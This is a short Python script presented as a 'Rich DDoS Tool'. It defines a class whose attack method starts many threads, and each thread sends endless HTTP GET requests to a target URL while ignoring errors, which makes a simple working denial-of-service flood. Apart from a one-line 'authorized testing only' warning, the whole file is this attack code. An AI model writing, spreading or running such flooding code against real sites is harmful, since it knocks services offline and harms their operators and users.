#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rich DDoS Tool"""

from rich.console import Console
from rich.progress import Progress
import requests
import threading

console = Console()

class DDoSTool:
    def __init__(self):
        self.threads = []
    
    def attack(self, url, threads=10):
        """DDoS attack"""
        console.print(f"[bold red]Attacking: {url}[/bold red]")
        console.print(f"[yellow]⚠ For authorized testing only![/yellow]")
        
        def flood():
            while True:
                try:
                    requests.get(url, timeout=1)
                except:
                    pass
        
        for i in range(threads):
            t = threading.Thread(target=flood)
            t.start()
            self.threads.append(t)
        
        console.print(f"[green]✓ {threads} threads started[/green]")

if __name__ == "__main__":
    tool = DDoSTool()
    console.print("[yellow]DDoS tool[/yellow]")

